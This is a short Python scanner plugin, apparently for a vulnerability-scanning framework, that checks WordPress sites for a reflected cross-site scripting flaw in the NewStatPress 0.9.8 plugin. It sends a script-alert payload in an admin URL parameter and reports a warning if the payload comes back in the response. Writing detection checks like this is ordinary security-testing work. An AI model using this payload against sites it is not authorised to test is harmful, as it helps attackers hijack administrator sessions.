#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 我爱馒头妹妹
#__Service_ = wordpress
# __Refer___ =https://www.exploit-db.com/exploits/37107/




def assign(service, arg):
    if service == "wordpress":
        return True, arg



def audit(args):
    #在测试的时候需要带上自己的cookie
    #cookie = ''
    xss_payload = 'wp-admin/admin.php?where1=<script>alert(/xss/)</script>&searchsubmit=Buscar&page=nsp_search'

    #Test Xss
    xss_verify_url = args + xss_payload

    #code, head, content, errcode,finalurl = curl.curl2(xss_verify_url,cookie = cookie)
    code, head, content, errcode,finalurl = curl.curl2(xss_verify_url)
    if code==200 and '<script>alert(/xss/)</script>' in content:
            security_warning('WordPress NewStatPress Plugin 0.9.8 Xss')
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://127.0.0.1/wordpress/')[1])